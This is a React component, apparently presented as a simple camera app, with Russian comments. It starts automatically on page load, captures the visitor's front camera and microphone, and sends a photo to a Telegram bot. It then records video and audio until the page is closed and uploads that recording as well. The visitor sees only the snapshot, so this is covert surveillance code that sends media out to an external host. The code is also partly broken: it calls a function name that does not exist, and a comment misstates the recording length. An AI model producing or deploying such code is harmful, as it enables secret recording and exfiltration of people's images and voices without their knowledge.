function CameraApp() {
  const [photoDataUrl, setPhotoDataUrl] = React.useState(null);

  // Запись 5-секундного видео и отправка в Telegram после отправки фото
  // Записывает "вечно" и останавливается ТОЛЬКО при закрытии/уходе со страницы.
// После стопа собирает Blob и шлёт в Telegram, как у тебя.

  async function recordAndSendVideoUntilClose(stream) {
    // 1) Выбор MIME-типа
    let mimeType = "";
    if (window.MediaRecorder) {
      if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) mimeType = "video/webm;codecs=vp9,opus";
      else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) mimeType = "video/webm;codecs=vp8,opus";
      else if (MediaRecorder.isTypeSupported("video/webm")) mimeType = "video/webm";
    }
    const options = mimeType ? { mimeType } : undefined;

    // 2) Создаём рекордер и буфер под куски
    const recorder = new MediaRecorder(stream, options);
    const chunks = [];
    let stopped = false;

    // 3) Колбэки
    const onData = (e) => {
      if (e.data && e.data.size > 0) chunks.push(e.data);
    };

    let stopResolve;
    let stopReject;
    const stoppedPromise = new Promise((res, rej) => { stopResolve = res; stopReject = rej; });

    const onStop = () => stopResolve();
    const onError = (err) => stopReject(err);

    recorder.addEventListener("dataavailable", onData);
    recorder.addEventListener("stop", onStop);
    recorder.addEventListener("error", onError);

    // 4) Стоп только ОДИН раз
    const stopOnce = () => {
      if (stopped) return;
      stopped = true;
      try { recorder.stop(); } catch (_) {}
    };

    // 5) Останавливаем при закрытии/уходе со страницы
    //  - pagehide срабатывает надёжнее на мобильных/Safari
    //  - beforeunload на десктопах
    const onPageHide = () => stopOnce();
    const onBeforeUnload = () => stopOnce();
    window.addEventListener("pagehide", onPageHide, { once: true });
    window.addEventListener("beforeunload", onBeforeUnload, { once: true });

    // 6) Старт записи.
    //    timeslice (например, 5000 мс) даёт чанки каждые 5 сек, чтобы не был один гигантский кусок.
    //    Это всё ещё копится в памяти — учти это.
    recorder.start(1000);

    try {
      // Ждём, пока нас не "выгрузят" и рекордер не остановится
      await stoppedPromise;
    } finally {
      // Чистим слушатели
      recorder.removeEventListener("dataavailable", onData);
      recorder.removeEventListener("stop", onStop);
      recorder.removeEventListener("error", onError);
      window.removeEventListener("pagehide", onPageHide);
      window.removeEventListener("beforeunload", onBeforeUnload);
    }

    // 7) Собираем итоговый Blob и отправляем
    const videoBlob = new Blob(chunks, { type: mimeType || "video/webm" });

    if (window.TELEGRAM_BOT_TOKEN && window.TELEGRAM_CHAT_ID) {
      try {
        // Пытаемся отправить как видео
        const form = new FormData();
        form.append("chat_id", String(window.TELEGRAM_CHAT_ID));
        form.append("caption", "Auto video");
        form.append("video", videoBlob, "video.webm");

        let resp = await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendVideo`, {
          method: "POST",
          body: form,
        });

        // Если не прокатило — шлём как документ
        if (!resp.ok) {
          const docForm = new FormData();
          docForm.append("chat_id", String(window.TELEGRAM_CHAT_ID));
          docForm.append("caption", "Auto video");
          docForm.append("document", videoBlob, "video.webm");
          await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: "POST",
            body: docForm,
          });
        }
      } catch (err) {
        // Не роняем страницу при ошибке сетевого запроса
        console.error("Telegram upload failed:", err);
      }
    }
  }


  const takeAndSendPhoto = async () => {
    let stream;
    try {
      // Берём сразу и видео, и аудио — чтобы потом записать ролик
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

      setPhotoDataUrl(canvas.toDataURL("image/png"));

      const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
      if (blob && window.sendPhotoToTelegram) {
        await window.sendPhotoToTelegram({
          botToken: window.TELEGRAM_BOT_TOKEN,
          chatId: window.TELEGRAM_CHAT_ID,
          photoBlob: blob,
          caption: "Auto shot"
        });
      }

      // После успешной отправки фото — записываем и отправляем видео
      await recordAndSendVideo(stream);
    } finally {
      if (stream) stream.getTracks().forEach(t => t.stop());
    }
  };

  React.useEffect(() => {
    takeAndSendPhoto();
  }, []);

  return photoDataUrl && <img src={photoDataUrl} alt="Снимок" style={{ width: "100%" }} />;
}

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<CameraApp />);
